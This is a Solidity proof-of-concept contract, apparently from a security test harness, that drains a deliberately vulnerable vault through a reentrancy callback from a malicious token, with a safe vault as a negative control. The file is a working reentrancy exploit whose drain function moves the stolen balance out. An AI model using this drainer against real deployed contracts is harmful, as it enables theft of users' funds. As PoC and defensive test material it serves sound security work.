// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import {AdversarialERC20} from "../token/AdversarialERC20.sol";

/// @notice Minimal vault surface both the vulnerable and the safe vault expose.
interface IDepositVault {
    function deposit(uint256 amount) external;
    function withdraw(uint256 amount) external;
}

/// @title ReentrancyAttacker
/// @notice Drains a vault whose `withdraw` updates state after the external call.
///         The malicious token is configured to call back into `reenter()` on
///         every transfer, so the vault's balance check runs repeatedly against a
///         stale balance.
/// @dev Works against `VulnerableVault`; the *same* contract and sequence reverts
///      against `SafeVault` (the negative control), which is what makes the PoC
///      specific to the missing reentrancy defence.
contract ReentrancyAttacker {
    IDepositVault public vault;
    AdversarialERC20 public asset;
    uint256 public target;
    uint256 public reentered;

    function attack(address vault_, AdversarialERC20 asset_, uint256 amount) external {
        vault = IDepositVault(vault_);
        asset = asset_;
        target = amount;
        asset.approve(vault_, amount);
        vault.deposit(amount);
        asset.setReentry(address(this), abi.encodeCall(this.reenter, ()));
        vault.withdraw(amount);
        asset.disableReentry();
    }

    /// @notice Re-entered from inside `vault.withdraw` (via the token transfer).
    function reenter() external {
        if (reentered >= 3) return; // bound the recursion for a deterministic PoC
        reentered++;
        vault.withdraw(target);
    }

    function drain(address to) external {
        uint256 bal = asset.balanceOf(address(this));
        asset.transfer(to, bal);
    }
}
